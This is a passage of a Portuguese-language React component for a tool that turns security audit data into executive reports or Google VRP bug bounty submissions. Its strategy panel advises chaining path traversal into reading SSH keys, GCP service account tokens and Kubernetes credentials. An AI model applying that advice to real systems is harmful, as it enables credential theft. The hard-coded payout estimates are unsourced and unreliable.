            Mecanismo automatizado para converter relatórios lógicos de auditoria em layouts corporativos executivos ou em templates de vulnerabilidade **P0/P1 prontos para o Google VRP**.
          </p>
        </div>

        {/* Big Switcher tabs */}
        <div className="flex bg-zinc-950 border border-zinc-900 rounded-xl p-1 gap-1">
          <button
            onClick={() => setReportMode('google_vrp')}
            className={cn(
              "px-4 py-2 text-[10px] sm:text-xs font-mono font-bold uppercase rounded-lg transition-all",
              reportMode === 'google_vrp' 
                ? "bg-emerald-500 text-black shadow-lg" 
                : "text-zinc-500 hover:text-zinc-300"
            )}
          >
            Google VRP (P0/P1 Sniper)
          </button>
          <button
            onClick={() => setReportMode('universal')}
            className={cn(
              "px-4 py-2 text-[10px] sm:text-xs font-mono font-bold uppercase rounded-lg transition-all",
              reportMode === 'universal' 
                ? "bg-emerald-500 text-black shadow-lg" 
                : "text-zinc-500 hover:text-zinc-300"
            )}
          >
            Universal Compliance Report
          </button>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-5 gap-8">
        
        {/* Left Side: Parameters / Settings */}
        <div className="lg:col-span-2 space-y-6">
          
          {/* Google VRP Template Selector if active */}
          {reportMode === 'google_vrp' ? (
            <div className="bg-[#121212] border border-zinc-900 rounded-2xl p-5 sm:p-6 space-y-4">
              <h4 className="text-[11px] font-mono uppercase tracking-widest text-zinc-400 font-bold flex items-center gap-2">
                <Sparkles size={14} className="text-[#10b981]" /> Seleção de Alvo Google VRP
              </h4>
              <p className="text-[10px] text-zinc-500 leading-normal">
                Escolha o template estratégico P0 ou P1 pré-modelado com rigor de impacto e provas de conceito que impressionam triadores:
              </p>

              <div className="space-y-2">
                {GOOGLE_VRP_TEMPLATES.map((tpl) => (
                  <button
                    key={tpl.id}
                    onClick={() => setSelectedVrpTemplate(tpl.id)}
                    className={cn(
                      "w-full p-3.5 rounded-xl border transition-all text-left flex flex-col gap-1",
                      selectedVrpTemplate === tpl.id
                        ? "bg-[#10b981]/10 border-[#10b981] text-white"
                        : "bg-zinc-950 border-zinc-900 text-zinc-400 hover:border-zinc-800"
                    )}
                  >
                    <div className="flex items-center justify-between">
                      <span className="text-[11px] font-mono font-black uppercase text-white">{tpl.id.replace(/_/g, ' ')}</span>
                      <span className={cn(
                        "text-[9px] font-mono px-2 py-0.5 rounded font-black",
                        tpl.severity === 'P0' ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"
                      )}>
                        {tpl.severity} Severity
                      </span>
                    </div>
                    <span className="text-[10px] text-zinc-500 line-clamp-1">{tpl.title}</span>
                  </button>
                ))}
              </div>

              {/* Asset Parameter customizer */}
              <div className="space-y-1.5 pt-2">
                <label className="text-[10px] font-mono uppercase text-zinc-500">Asset / Host Afetado:</label>
                <input 
                  type="text"
                  value={customAsset}
                  onChange={(e) => setCustomAsset(e.target.value)}
                  className="w-full bg-black/40 border border-zinc-850 rounded-lg p-2.5 text-xs text-zinc-300 font-mono focus:outline-none focus:border-emerald-500/30"
                />
              </div>

              {/* TIER 1 BUG HUNTER STRATEGY GUIDE */}
              <div className="border-t border-zinc-900 pt-5 mt-4 space-y-4">
                <div className="flex items-center gap-2 text-amber-400">
                  <Zap size={14} className="animate-pulse text-amber-500" />
                  <h5 className="text-xs font-mono font-bold uppercase tracking-wider">
                    Google VRP Tier 1 Maximizer
                  </h5>
                </div>
                
                <p className="text-[10px] text-zinc-400 leading-normal">
                  Muitas submissões de cookie-flags ou cabeçalhos ausentes (CSP, HSTS) são rejeitadas por falta de impacto prático. Para entrar no <strong>Hall da Fama</strong> e obter payouts de Tier 1, siga estas diretrizes estratégicas:
                </p>

                <div className="bg-zinc-950 border border-zinc-900 rounded-xl p-3.5 space-y-3.5 text-[11px]">
                  <div className="space-y-1">
                    <span className="text-[9px] font-mono font-bold uppercase tracking-wider text-emerald-400 block">
                      💡 Regra #1: Evite Vulnerabilidades Teóricas (Flags)
                    </span>
                    <p className="text-zinc-500 text-[10px] leading-normal">
                      A ausência de cabeçalhos como <code className="text-red-400 font-mono">X-Frame-Options</code> ou cookies sem <code className="text-red-400 font-mono">HttpOnly</code> não geram pagamento sem um exploit funcional (ex: provar que a falta do cookie vaza sessões confidenciais através de um XSS).
                    </p>
                  </div>

                  <div className="space-y-1">
                    <span className="text-[9px] font-mono font-bold uppercase tracking-wider text-emerald-400 block">
                      🚀 Regra #2: Encadear para Elevar Severidade (Chain)
                    </span>
                    <p className="text-zinc-500 text-[10px] leading-normal">
                      Não reporte um Path Traversal apenas mostrando <code className="text-zinc-300 font-mono">/etc/passwd</code>. Demonstre impacto real lendo chaves privadas SSH, tokens de Contas de Serviço GCP ou arquivos de credenciais Kubernetes para alcançar privilégios administrativos.
                    </p>
                  </div>

                  <div className="space-y-1">
                    <span className="text-[9px] font-mono font-bold uppercase tracking-wider text-emerald-400 block">
                      🌐 Regra #3: Foco no Escopo Principal (Core Domains)
                    </span>
                    <p className="text-zinc-500 text-[10px] leading-normal">
                      Vulnerabilidades em domínios principais (<code className="text-zinc-300 font-mono">*.google.com</code>, <code className="text-zinc-300 font-mono">*.youtube.com</code>, <code className="text-zinc-300 font-mono">*.googleplex.com</code>) pagam muito mais do que aquisições recentes ou blogs institucionais.
                    </p>
                  </div>
                </div>

                {/* Interactive VRP Payout Estimator Calculator */}
                <div className="bg-zinc-950/40 border border-zinc-900 rounded-xl p-4 space-y-3">
                  <span className="text-[10px] font-mono text-zinc-400 uppercase tracking-wider block font-bold">
                    🧮 Simulador de Recompensa (Google VRP)
                  </span>
                  
                  <div className="grid grid-cols-2 gap-2 text-[10px]">
                    <div className="space-y-1">
                      <span className="text-zinc-500">Alvo do Relatório:</span>
                      <select 
                        id="vrp-target-scope"
                        className="w-full bg-zinc-900 border border-zinc-800 rounded p-1.5 text-[10px] text-zinc-300 focus:outline-none focus:border-emerald-500/30"
                        onChange={(e) => {
                          const targetVal = e.target.value;
                          const sevEl = document.getElementById('vrp-calc-sev') as HTMLSelectElement;
                          const payoutEl = document.getElementById('vrp-payout-est');
                          if (!sevEl || !payoutEl) return;
                          
                          let amount = "$0 USD (Rejeitado/Apenas Menção Honrosa)";
                          const sevVal = sevEl.value;
                          if (sevVal === 'rce') {
                            if (targetVal === 'core') amount = "$31,337 USD (Tier 1 P0)";
                            else if (targetVal === 'highly_sensitive') amount = "$20,000 USD (Tier 1 P0)";
                            else if (targetVal === 'normal') amount = "$13,337 USD (P0)";
                            else amount = "$5,000 USD";
                          } else if (sevVal === 'ssrf') {
                            if (targetVal === 'core') amount = "$13,337 USD (Tier 1)";
                            else if (targetVal === 'highly_sensitive') amount = "$10,000 USD (P0)";
                            else amount = "$3,133 USD";
                          } else if (sevVal === 'unauth_data') {
                            if (targetVal === 'core') amount = "$7,500 USD (P1)";
                            else if (targetVal === 'highly_sensitive') amount = "$5,000 USD (P1)";
                            else amount = "$1,337 USD";
                          } else if (sevVal === 'csrf_xss') {
                            if (targetVal === 'core') amount = "$3,133 USD (P2)";
                            else amount = "$1,337 USD";
                          } else {
                            amount = "$0 USD (Falta de Impacto Crítico)";
                          }
                          payoutEl.innerText = amount;
                        }}
                      >
                        <option value="core">Escopo Core (google.com, youtube.com)</option>
                        <option value="highly_sensitive">Sensível (googleplex.com, GCP core)</option>
                        <option value="normal">Escopo Normal (Blogger, etc)</option>
                        <option value="acquisition">Aquisições Recentes</option>
                      </select>
                    </div>

                    <div className="space-y-1">
                      <span className="text-zinc-500">Nível do Impacto:</span>
                      <select 
                        id="vrp-calc-sev"
                        className="w-full bg-zinc-900 border border-zinc-800 rounded p-1.5 text-[10px] text-zinc-300 focus:outline-none focus:border-emerald-500/30"
                        onChange={(e) => {
                          const sevVal = e.target.value;
                          const targetEl = document.getElementById('vrp-target-scope') as HTMLSelectElement;
                          const payoutEl = document.getElementById('vrp-payout-est');
                          if (!targetEl || !payoutEl) return;
                          
                          let amount = "$0 USD (Rejeitado/Apenas Menção Honrosa)";
                          const targetVal = targetEl.value;
                          if (sevVal === 'rce') {
                            if (targetVal === 'core') amount = "$31,337 USD (Tier 1 P0)";
                            else if (targetVal === 'highly_sensitive') amount = "$20,000 USD (Tier 1 P0)";
                            else if (targetVal === 'normal') amount = "$13,337 USD (P0)";
                            else amount = "$5,000 USD";
                          } else if (sevVal === 'ssrf') {
                            if (targetVal === 'core') amount = "$13,337 USD (Tier 1)";
                            else if (targetVal === 'highly_sensitive') amount = "$10,000 USD (P0)";
                            else amount = "$3,133 USD";
                          } else if (sevVal === 'unauth_data') {
                            if (targetVal === 'core') amount = "$7,500 USD (P1)";
                            else if (targetVal === 'highly_sensitive') amount = "$5,000 USD (P1)";
                            else amount = "$1,337 USD";
                          } else if (sevVal === 'csrf_xss') {
                            if (targetVal === 'core') amount = "$3,133 USD (P2)";
                            else amount = "$1,337 USD";
                          } else {
                            amount = "$0 USD (Falta de Impacto Crítico)";
                          }
                          payoutEl.innerText = amount;
                        }}
                      >
                        <option value="rce">Remote Code Execution (P0/Tier 1)</option>
                        <option value="ssrf">SSRF (Metadata/Auth bypass) (P0)</option>
                        <option value="unauth_data">Vazamento de Dados Privados (P1)</option>
                        <option value="csrf_xss">Bypass Lógico / XSS Core (P2)</option>
                        <option value="header_cookie">Apenas Cookie-flag / Teórico (Sem Payout)</option>
                      </select>
                    </div>
                  </div>

                  <div className="pt-2 flex items-center justify-between border-t border-zinc-900/60 font-mono">
                    <span className="text-zinc-500 text-[10px]">Recompensa Estimada:</span>
                    <span id="vrp-payout-est" className="text-[#10b981] font-bold text-xs">
                      $31,337 USD (Tier 1 P0)
                    </span>
                  </div>
                </div>
              </div>
            </div>
          ) : (
            // Universal compliance upload side
            <>
              <div className="bg-[#121212] border border-zinc-900 rounded-2xl p-5 sm:p-6 space-y-4">
                <h4 className="text-[11px] font-mono uppercase tracking-widest text-zinc-400 font-bold flex items-center gap-2">
                  <Sparkles size={14} className="text-[#10b981]" /> SaaS Pipeline Simulator
                </h4>
                <p className="text-[10px] text-zinc-500 leading-normal">
                  Execute a dynamic Black Box mutation run to trigger system states, zero-division outcomes, and coupon value loops in real time, directly populating the local state.
                </p>

                {isSaaSRunning ? (
                  <div className="bg-black/60 border border-zinc-850 rounded-xl p-4 font-mono text-[10px] space-y-1.5 leading-relaxed text-zinc-400 h-40 overflow-y-auto">
                    {saasLogs.map((log, i) => (
                      <div key={i} className="text-emerald-400">{log}</div>
                    ))}
                    <div className="text-zinc-600 animate-pulse">Running SaaS mutation calculation matrix...</div>
                  </div>
                ) : (
                  <button
                    onClick={runSaaSMutationEngine}
                    className="w-full py-2.5 bg-zinc-900 border border-zinc-800 hover:bg-zinc-850 hover:border-zinc-700 text-zinc-300 font-bold uppercase text-[10px] tracking-widest rounded-xl transition-all flex items-center justify-center gap-2"
                  >
                    <Cpu size={12} className="text-[#10b981] animate-spin" /> Iniciar Mutador SaaS (Automático)
                  </button>
                )}
              </div>

              <div 
                onDragOver={handleDragOver}
                onDrop={handleDrop}
                className="bg-[#121212] border border-zinc-900 rounded-2xl p-5 sm:p-6 space-y-4"
              >
                <div className="flex items-center justify-between">
                  <span className="text-[11px] font-mono uppercase tracking-widest text-zinc-500 font-bold flex items-center gap-2">
                    <Database size={14} className="text-[#10b981]" /> Entrada JSON (Payload Bruto)
                  </span>
                  
                  <label className="cursor-pointer px-3 py-1 bg-zinc-950 border border-zinc-800 rounded-md text-[10px] font-mono text-zinc-400 hover:text-white transition-colors uppercase flex items-center gap-1.5 font-bold">
                    <UploadCloud size={12} /> Carregar Arquivo
                    <input 
                      type="file" 
                      accept=".json" 
                      onChange={handleUploadClick} 
                      className="hidden" 
                    />
                  </label>
                </div>

                <textarea
                  value={inputText}
                  onChange={(e) => {
                    setInputText(e.target.value);
                    if (e.target.value.trim().endsWith('}')) {
                      handleProcessJSON(e.target.value);
                    }
                  }}
                  placeholder="Cole o JSON de logs e payloads da auditoria aqui..."
                  className="w-full h-80 bg-black/40 border border-zinc-850 rounded-xl p-4 font-mono text-xs text-emerald-400 focus:outline-none focus:border-emerald-500/30 transition-all resize-none"
                />

                {error && (
                  <div className="p-3 bg-red-950/20 border border-red-900/40 rounded-xl text-[11px] font-mono text-red-400 leading-relaxed">
                    ⚠️ {error}
                  </div>
                )}

                <button
                  onClick={() => handleProcessJSON(inputText)}
                  className="w-full py-3 bg-[#10b981] hover:bg-[#10b981]/90 text-black font-bold uppercase text-xs tracking-wider rounded-xl transition-all flex items-center justify-center gap-2 shadow-[0_0_20px_rgba(16,185,129,0.15)]"
                >
                  <Cpu size={14} /> Processar Dados Executivos
                </button>
              </div>
            </>
          )}

          <div className="bg-[#121212]/50 border border-zinc-900 p-5 rounded-2xl space-y-3">
            <h4 className="text-zinc-400 text-xs font-mono font-bold uppercase tracking-widest">Pilar AWS Architecture</h4>
            <p className="text-zinc-600 text-[10px] leading-relaxed">
              O gerador opera com base nos pilares de **Segurança (Zero Trust)** e **Confiabilidade** do AWS Well-Architected Framework, modelando remediações acionáveis de assinatura e mitigação canônica.
            </p>
          </div>
        </div>

        {/* Right Side: Professional Render / Presentation Area */}
        <div className="lg:col-span-3 space-y-6">
          
          {/* RENDER BOX */}
          <div className="bg-[#121212] border border-zinc-900 rounded-2xl overflow-hidden shadow-2xl">
            
            {/* Header inside report box */}
            <div className="bg-zinc-950 px-6 py-5 border-b border-zinc-900 flex justify-between items-center gap-4 flex-wrap">
              <div className="space-y-1">
                <div className="flex items-center gap-2">
                  <span className="text-[10px] font-mono text-emerald-400 uppercase tracking-widest font-bold">
                    {reportMode === 'google_vrp' ? "Google VRP Sniper Mode" : "Confidencial • Relatório Executivo"}
                  </span>
                  <Badge variant={reportMode === 'google_vrp' ? 'danger' : 'neutral'}>
                    {reportMode === 'google_vrp' ? activeTemplate.severity : "v5.0"}
                  </Badge>
                </div>
                <h3 className="text-white font-bold text-sm font-mono uppercase">
                  {reportMode === 'google_vrp' ? activeTemplate.title : "SESSÃO: " + (parsedReport?.audit_session?.chain_id || "CHL-CHAIN-9521")}
                </h3>
              </div>

              <div className="flex items-center gap-2">
                <button
                  onClick={handleCopyToClipboard}
                  className="p-2 bg-zinc-900 hover:bg-zinc-800 hover:text-white border border-zinc-850 rounded-lg text-zinc-400 text-xs font-mono transition-all flex items-center gap-1.5 uppercase font-bold"
                  title="Copiar Relatório em Markdown"
                >
                  {copied ? <Check size={14} className="text-[#10b981]" /> : <Copy size={14} />}
                  <span>{copied ? "Copiado!" : "Copiar MD"}</span>
                </button>

                <button
                  onClick={handleDownloadMarkdown}
                  className="p-2 bg-zinc-900 hover:bg-zinc-800 hover:text-white border border-[#10b981]/20 rounded-lg text-[#10b981] text-xs font-mono transition-all flex items-center gap-1.5 uppercase font-bold"
                >
                  <Download size={14} />
                  <span>Baixar MD</span>
                </button>
              </div>
            </div>

            {/* TAB SELECTORS - CONDITIONAL ON MODE */}
            {reportMode === 'google_vrp' ? (
              /* Google VRP specific tab list */
              <div className="flex border-b border-zinc-90 w-full overflow-x-auto no-scrollbar bg-zinc-950/40 p-1">
                {[
                  { id: 'summary', name: '1. Summary & Asset' },
                  { id: 'evidence', name: '2. Step-by-Step PoC' },
                  { id: 'compliance', name: '3. Technical Impact' },
                  { id: 'diagnosis', name: '4. Code Fix Guard' },
                ].map(tab => (
                  <button
                    key={tab.id}
                    onClick={() => setActiveTab(tab.id as any)}
                    className={cn(
                      "flex-1 py-3 text-[10px] sm:text-xs font-mono font-bold uppercase transition-all border-b-2 text-center whitespace-nowrap px-4",
                      activeTab === tab.id 
                        ? "text-[#10b981] border-[#10b981] bg-black/30" 
                        : "text-zinc-500 hover:text-zinc-300 border-transparent"
                    )}
                  >
                    {tab.name}
                  </button>
                ))}
              </div>
            ) : (
              /* Universal compliance tabs */
              <div className="flex border-b border-zinc-90 w-full overflow-x-auto no-scrollbar bg-zinc-950/40 p-1">
                {[
                  { id: 'summary', name: '1. Sumário Executivo' },
                  { id: 'compliance', name: '2. Mapeamento Global' },
                  { id: 'evidence', name: '3. Prova de Conceito' },
                  { id: 'diagnosis', name: '4. Diagnóstico Final' },
                ].map(tab => (
                  <button
                    key={tab.id}
                    onClick={() => setActiveTab(tab.id as any)}
                    className={cn(
                      "flex-1 py-3 text-[10px] sm:text-xs font-mono font-bold uppercase transition-all border-b-2 text-center whitespace-nowrap px-4",
                      activeTab === tab.id 
                        ? "text-[#10b981] border-[#10b981] bg-black/30" 
                        : "text-zinc-500 hover:text-zinc-300 border-transparent"
                    )}
                  >
                    {tab.name}
                  </button>
                ))}
              </div>
            )}

            {/* CONTENT RENDER PANEL */}
            <div className="p-6 sm:p-8 min-h-96">
              <AnimatePresence mode="wait">
                
                {/* ------------------------------------------------------------------
                    GOOGLE VRP MODE DISPLAY
                    ------------------------------------------------------------------ */}
                {reportMode === 'google_vrp' && (
                  <div className="space-y-6">
                    {activeTab === 'summary' && (
                      <motion.div 
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        className="space-y-6"
                      >
                        <div className="p-5 bg-zinc-950 border border-zinc-900 rounded-xl space-y-4">
                          <div className="flex items-center gap-3">
                            <span className="px-2 py-1 rounded bg-red-500/10 text-red-400 font-mono text-xs font-bold uppercase">
                              Severity Class: {activeTemplate.severity}
                            </span>
                            <span className="text-zinc-500 font-mono text-xs">CWE: {activeTemplate.cwe}</span>
                          </div>
                          
                          <div className="space-y-1.5">
                            <span className="text-[10px] font-mono text-zinc-500 uppercase">Target Endpoint / Asset:</span>
                            <div className="p-2.5 bg-black/40 border border-zinc-850 rounded font-mono text-xs text-white">
                              {customAsset}
                            </div>
                          </div>

                          <div className="space-y-1.5">
                            <span className="text-[10px] font-mono text-zinc-500 uppercase">Description Summary:</span>
                            <p className="text-zinc-300 text-xs leading-relaxed font-sans">{activeTemplate.description}</p>
                          </div>
                        </div>
                      </motion.div>
                    )}

                    {activeTab === 'evidence' && (
                      <motion.div 
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        className="space-y-4"
                      >
                        <div className="space-y-1.5">
                          <span className="text-[10px] font-mono text-zinc-500 uppercase">Scenario Logic Steps:</span>
                          <p className="text-zinc-300 text-xs leading-relaxed">{activeTemplate.attack_scenario}</p>
                        </div>

                        <div className="space-y-1.5 pt-2">
                          <span className="text-[10px] font-mono text-zinc-500 uppercase">Proof of Concept Commands (Curl):</span>
                          <pre className="text-[11px] font-mono text-emerald-400 bg-zinc-950 p-4 rounded-xl overflow-x-auto whitespace-pre border border-zinc-900">
                            {activeTemplate.poc_steps.replace(/```[a-z]*\n/g, '').replace(/```/g, '')}
                          </pre>
                        </div>
                      </motion.div>
                    )}

                    {activeTab === 'compliance' && (
                      <motion.div 
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        className="space-y-4"
                      >
                        <div className="p-5 bg-red-950/5 border border-red-900/20 rounded-xl space-y-3">
                          <h4 className="text-xs font-mono font-bold uppercase tracking-wider text-red-400 flex items-center gap-2">
                            <AlertOctagon size={14} /> Security and Business Impact Assessment
                          </h4>
                          <p className="text-zinc-300 text-xs leading-relaxed font-sans">
                            {activeTemplate.impact_assessment}
                          </p>
                        </div>

                        <div className="p-4 bg-zinc-950 border border-zinc-900 rounded-xl text-[11px] font-mono text-zinc-500 leading-relaxed">
                          <strong className="text-white mr-1">Google VRP Rule Alignment:</strong>
                          By demonstrating execution/leakage on internal infrastructure components, this vulnerability represents zero-user-interaction impact, conforming directly to high reward eligibility tables.
                        </div>
                      </motion.div>
                    )}

                    {activeTab === 'diagnosis' && (
                      <motion.div 
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        className="space-y-4"
                      >
                        <div className="space-y-1.5">
                          <span className="text-[10px] font-mono text-zinc-500 uppercase">Secure Mitigation Patch:</span>
                          <pre className="text-[11px] font-mono text-emerald-400 bg-zinc-950 p-4 rounded-xl overflow-x-auto whitespace-pre border border-zinc-900">
                            {activeTemplate.remediation_code}
                          </pre>
                        </div>

                        <div className="space-y-1.5 pt-2">
                          <span className="text-[10px] font-mono text-zinc-500 uppercase">Fix Mechanics:</span>
                          <p className="text-zinc-400 text-xs leading-relaxed">{activeTemplate.remediation_explanation}</p>
                        </div>
                      </motion.div>
                    )}
                  </div>
                )}

                {/* ------------------------------------------------------------------
                    UNIVERSAL MODE DISPLAY (Executive Compliance)
                    ------------------------------------------------------------------ */}
                {reportMode === 'universal' && parsedReport && (
                  <div className="space-y-8">
                    {activeTab === 'summary' && (
                      <motion.div 
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        className="space-y-8"
                      >
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                          <div className="bg-[#ef4444]/5 border border-[#ef4444]/20 p-5 rounded-xl space-y-2 relative overflow-hidden group">
                            <div className="absolute top-4 right-4 text-[#ef4444]/20 group-hover:text-[#ef4444]/30 transition-colors">
                              <TrendingDown size={40} />
                            </div>
                            <span className="text-[9px] font-mono text-[#ef4444]/80 uppercase tracking-wider font-bold">Risco de Perda Instantânea</span>
                            <h4 className="text-2xl sm:text-3xl font-black text-[#ef4444]">
                              {metrics.financialRiskValue > 0 ? formatBRL(metrics.financialRiskValue) : "R$ 0,00"}
                            </h4>
                            <p className="text-zinc-400 text-[10px] leading-relaxed font-mono">
                              por cada transação de faturamento executada sem validação física.
                            </p>
                          </div>

                          <div className={cn(
                            "p-5 rounded-xl space-y-2 relative overflow-hidden group border",
                            metrics.systemCrash 
                              ? "bg-amber-600/5 border-amber-500/20" 
                              : "bg-zinc-900/40 border-zinc-800"
                          )}>
                            <div className="absolute top-4 right-4 text-zinc-700/30">
                              <AlertOctagon size={40} />
                            </div>
                            <span className="text-[9px] font-mono text-zinc-500 uppercase tracking-wider font-bold">Integridade de Rede</span>
                            <h4 className={cn(
                              "text-base sm:text-lg font-bold font-mono tracking-wide",
                              metrics.systemCrash ? "text-amber-400 text-sm" : "text-white"
                            )}>
                              {metrics.systemCrash ? "COLAPSO DIGITAL (System Crash)" : "ESTABILIDADE NORMAL"}
                            </h4>
                            <p className="text-zinc-500 text-[10px] leading-relaxed">
                              Divisores vazios sem travas de barreira induzem interrupções letais das threads.
                            </p>
                          </div>
                        </div>

                        <div className="flex flex-col sm:flex-row justify-between items-start gap-4 p-4 bg-zinc-950 border border-zinc-850 rounded-xl font-mono text-[11px]">
                          <div>
                            <span className="text-zinc-500">Gravificação de Severidade:</span>
                            <span className="text-red-400 font-bold uppercase ml-2">{parsedReport.vulnerability_chain?.[1]?.severity || "CRÍTICA"}</span>
                          </div>
                          <div>
                            <span className="text-zinc-500">Vulnerabilidades Rastreáveis:</span>
                            <span className="text-[#10b981] font-bold ml-2">{metrics.totalCwe} CWEs Ativos</span>
                          </div>
                          <div>
                            <span className="text-zinc-500">Triage Scope:</span>
                            <span className="text-white font-bold ml-2">{metrics.maxPriority} Priority High</span>
                          </div>
                        </div>

                        <div className="space-y-4">
                          <h4 className="text-[#10b981] text-xs font-mono font-bold uppercase tracking-widest flex items-center gap-2">
                            <Scale size={14} /> Resumo Analítico de Negócio
                          </h4>
                          <div className="text-zinc-300 text-sm leading-relaxed space-y-4 p-5 bg-black/30 border border-zinc-900 rounded-xl select-none">
                            <p>
                              A auditoria de mutação simulada rastreou o encadeamento de falhas lógicas no sistema de checkout e nos limites de pastas. 
                            </p>
                            <p>
                              A presença de parâmetros de entrada numéricos não validados (<code className="text-red-400 font-mono">payload: {parsedReport.vulnerability_chain?.[1]?.execution_vector?.payload || "-15074"}</code>) inverte a aritmética interna de crédito e faturamento. Se explorada em larga escala por agentes automatizados, a falha cria um <strong>canal contínuo de sangria de receita</strong> sem que alarmes de autenticidade convencionais sejam acionados no WAF.
                            </p>
                          </div>
                        </div>
                      </motion.div>
                    )}

                    {activeTab === 'compliance' && (
                      <motion.div 
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        className="space-y-6"
                      >
                        <h4 className="text-[#10b981] text-xs font-mono font-bold uppercase tracking-widest">
                          Adequação de Ativos Globais e CWEs
                        </h4>
                        
                        <div className="space-y-4">
                          {(parsedReport.vulnerability_chain || parsedReport.vulnerabilities || []).map((v: any, idx: number) => {
                            const safetyMeta = CWE_BUSINESS_RISK_MAP[v.cwe_id] || {
                              title: v.vulnerability_type,
                              scope: "Mapeamento Comportamental",
                              risk_desc: "Validação insatisfatória em APIs ou inputs públicos.",
                              business_impact: "Risco de desfalque em APIs expostas."
                            };

                            const vec = v.execution_vector || {};
                            const remed = vec.patch_remediation || {};

                            return (
                              <div key={idx} className="bg-zinc-950 border border-zinc-900 rounded-xl p-5 space-y-4">
                                <div className="flex justify-between items-center flex-wrap gap-2">
                                  <div className="flex items-center gap-2.5">
                                    <span className="px-2 py-0.5 rounded bg-[#10b981]/15 text-[#10b981] font-mono text-xs font-bold">{v.cwe_id}</span>
                                    <span className="text-white text-xs font-mono font-bold">{v.vulnerability_type}</span>
                                  </div>
                                  <Badge variant={v.severity === 'CRITICAL' ? 'danger' : 'warning'}>{v.severity}</Badge>
                                </div>

                                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
                                  <div className="space-y-1 bg-black/20 p-3 rounded border border-zinc-900">
                                    <span className="text-zinc-500 font-mono text-[10px] uppercase">Risco de Negócio Enquadrado</span>
                                    <p className="text-zinc-300 leading-relaxed font-sans">{safetyMeta.risk_desc}</p>
                                  </div>
                                  <div className="space-y-1 bg-black/20 p-3 rounded border border-zinc-900">
                                    <span className="text-zinc-500 font-mono text-[10px] uppercase">Impacto Comercial Direto</span>
                                    <p className="text-zinc-300 leading-relaxed font-sans italic">{safetyMeta.business_impact}</p>
                                  </div>
                                </div>

                                {remed.target_file && (
                                  <div className="p-4 bg-zinc-900/50 border border-zinc-850 rounded-lg space-y-2">
                                    <div className="flex items-center justify-between text-[11px] font-mono text-zinc-500">
                                      <span>Fórmula de Correção Sanitária</span>
                                      <span className="text-[#10b981]">{remed.target_file}</span>
                                    </div>
                                    <pre className="text-[11px] font-mono text-emerald-400 bg-black/40 p-3 rounded overflow-x-auto whitespace-pre">
                                      {remed.validation_logic}
                                    </pre>
                                  </div>
                                )}
                              </div>
                            );
                          })}
                        </div>
                      </motion.div>
                    )}

                    {activeTab === 'evidence' && (
                      <motion.div 
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        className="space-y-8"
                      >
                        <div className="flex items-center justify-between">
                          <h4 className="text-[#10b981] text-xs font-mono font-bold uppercase tracking-widest">
                            Reação em Cadeia de Exploração (PoC Tree)
                          </h4>
                          <span className="text-[10px] font-mono text-zinc-500 uppercase">Arquitetura de Hunt Ativa</span>
                        </div>

                        <div className="relative pl-6 border-l border-zinc-800 space-y-10 ml-3">
                          {(parsedReport.vulnerability_chain || parsedReport.vulnerabilities || []).map((v: any, idx: number) => {
                            const vec = v.execution_vector || {};
                            return (
                              <div key={idx} className="relative space-y-3">
                                <div className="absolute -left-[31px] top-1.5 w-4.5 h-4.5 rounded-full bg-zinc-950 border-2 border-[#10b981] flex items-center justify-center z-10 shadow-[0_0_10px_rgba(16,185,129,0.3)]">
                                  <span className="text-[8px] font-mono font-bold text-[#10b981]">{v.step || idx + 1}</span>
                                </div>

                                <div className="flex items-center justify-between flex-wrap gap-2">
                                  <h5 className="text-white text-xs font-mono font-bold uppercase tracking-wide">
                                    Passo {v.step || idx + 1}: {v.vulnerability_type}
                                  </h5>
                                  <span className="text-[9px] font-mono px-2 py-0.5 rounded bg-zinc-900 border border-zinc-800 text-zinc-400">
                                    STATUS HTTP: {vec.status_code || "EXCEPT"}
                                  </span>
                                </div>

                                <div className="bg-[#111] p-4 rounded-xl border border-zinc-900 space-y-3">
                                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-[11px] font-mono text-zinc-500">
                                    <div>
                                      <span>Estrutura de Entrada:</span>
                                      <span className="text-zinc-300 ml-1.5">{vec.input_field}</span>
                                    </div>
                                    <div className="truncate">
                                      <span>Payload Entregue:</span>
                                      <span className="text-[#ef4444] font-bold ml-1.5">{String(vec.payload)}</span>
                                    </div>
                                  </div>

                                  <div className="text-xs text-zinc-400 bg-black/20 p-2.5 rounded border border-zinc-900 leading-relaxed font-sans">
                                    <strong className="text-zinc-500 font-mono text-[10px] mr-1 uppercase">Implicação de estado:</strong>
                                    {vec.leaked_data_reference 
                                      ? `Mapeou o contêiner interno resultando na exposição do segmento '${vec.leaked_data_reference}'.`
                                      : vec.mathematical_effect 
                                        ? `Inverteu o cálculo operacional resultando no efeito de '${vec.mathematical_effect}' e liberando saldo credor fictício.`
                                        : `Acionou estouro de memória no empilhamento de barreira e resultou em '${vec.exception_raised || "Crash"}' sistêmico.`
                                    }
                                  </div>
                                </div>
                              </div>
                            );
                          })}
                        </div>
                      </motion.div>
                    )}

                    {activeTab === 'diagnosis' && (
                      <motion.div 
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        className="space-y-6"
                      >
                        <div className="flex items-center justify-between border-b border-zinc-900 pb-4">
                          <h4 className="text-[#10b981] text-xs font-mono font-bold uppercase tracking-widest">
                            Parecer Técnico Comportamental do Auditor
                          </h4>
                        </div>

                        <div className="p-6 bg-zinc-950 border border-zinc-900 rounded-xl space-y-6 text-zinc-300 text-sm leading-relaxed font-sans select-none">
                          <div className="space-y-4">
                            <p>
                              A auditoria comportamental de segurança conduzida sob o rastreamento mutacional e simulação determinística de injeção provou, sem margem a falsos positivos, que as APIs voltadas ao público e o checkout fiduciário contam com lacunas graves de validação física preventiva.
                            </p>
                            <p>
